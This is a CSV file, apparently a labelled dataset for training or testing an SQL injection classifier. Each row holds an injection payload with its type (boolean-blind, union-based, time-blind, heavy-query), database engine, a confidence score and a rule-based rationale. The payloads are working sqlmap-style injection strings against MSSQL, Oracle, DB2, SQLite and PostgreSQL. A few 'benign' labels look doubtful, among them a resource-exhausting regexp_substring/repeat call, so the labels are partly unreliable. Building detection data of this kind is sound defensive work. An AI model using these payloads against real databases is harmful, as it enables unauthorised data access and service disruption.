id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19714,( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master..sysdatabases ) end ) ),boolean_blind,mssql,0.95,"Token match: 'case when','sysdatabases','master..' -> boolean_blind (priority P3); db_engine=mssql from evidence ['sysdatabases', 'master..']; payload snippet: '( select ( case when ( 7018 = 7018 ) then 7018 els'",3
19715,-7770' where 6503 = 6503 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-7770' where 6503 = 6503 or 2724 in ( ( char ( 113',3
19716,"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""nobt"" = ""nobt",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) ) or ( select 2* ( if ( ( select * from ( sel'",2
19717,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) '; db_evidence=none; classified benign/generic",2
19718,"1, ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '1, ( select ( case when ( 5777 = 5777 ) then 1 els'",3
19719,"1"" ) where 5065 = 5065",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1"" ) where 5065 = 5065'; db_evidence=none; classified benign/generic",2
19720,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kbkz' = 'kbkz",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'k'",2
19721,-2806' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'rxzr' = 'rxzr,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-2806' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 1',3
19722,"-9854%"" ) ) ) or 6455 = 3652",boolean_blind,generic,0.95,"Token match: 'or 6455 = 3652' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-9854%"" ) ) ) or 6455 = 3652'",3
19723,"1' where 4272 = 4272 union all select null,null,null,null#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' where 4272 = 4272 union all select null,null,nu'",3
19724,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-4465%' union all select 6196,6196,6196,6196,6196,'",3
19725,1 ) as tykp where 6851 = 6851,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1 ) as tykp where 6851 = 6851'; db_evidence=none; classified benign/generic,2
19726,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'dkra' like 'dkra",boolean_blind,db2,0.95,"Token match: 'weak signal','sysibm' -> boolean_blind (priority P3); db_engine=db2 from evidence ['sysibm']; payload snippet: '1' ) ) or 8315 = ( select count ( * ) from sysibm.'",3
19727,-3186 or 3867 = 9405,boolean_blind,generic,0.95,Token match: 'or 3867 = 9405' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-3186 or 3867 = 9405',3
19728,"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""quni"" = ""quni",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( r'",2
19729,"1' ) ) as jmnw where 6496 = 6496 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) ) as jmnw where 6496 = 6496 or 4411 = ( selec',3
19730,"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'obmu' = 'obmu",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: '1' ) or 8421 = ( select count ( * ) from generate_'",3
19731,"-4705' where 2029 = 2029 union all select 2029,2029,2029#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-4705' where 2029 = 2029 union all select 2029,202'",3
19732,1 where 4153 = 4153 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 where 4153 = 4153 and 3715 in ( ( char ( 113 ) +',3
19733,"1"" ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) and 2716 = ( select count ( * ) from sysusers'",3
19734,"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""oxxi"" = ""oxxi",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) or 5286 = ( select count ( * ) from all_users'",3
19735,1'|| ( select 'ozoj' where 1608 = 1608,benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1'|| ( select 'ozoj' where 1608 = 1608'; db_evidence=none; classified benign/generic,1
19736,"-5493"" ) ) union all select 8001,8001--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-5493"" ) ) union all select 8001,8001--'",3
19737,"1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( '",2
19738,"1' ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' ) ) ) union all select null,null,null,null,null'",3
19739,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1 ) ) union all select null,null,null,null,null,nu'",3
19740,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""dksc"" = ""dksc",boolean_blind,generic,0.95,"Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 '",3
19741,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""%"" = """,benign,generic,0.65,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: 'select count ( * ) from domain.domains as t1,domain.columns '; db_evidence=none; classified benign/generic",1
19742,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'ugoz' = 'ugoz,boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash '",3
19743,-7207' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'obxw' = 'obxw,boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '-7207' or 4747 = dbms_utility.sqlid_to_sqlhash ( ('",3
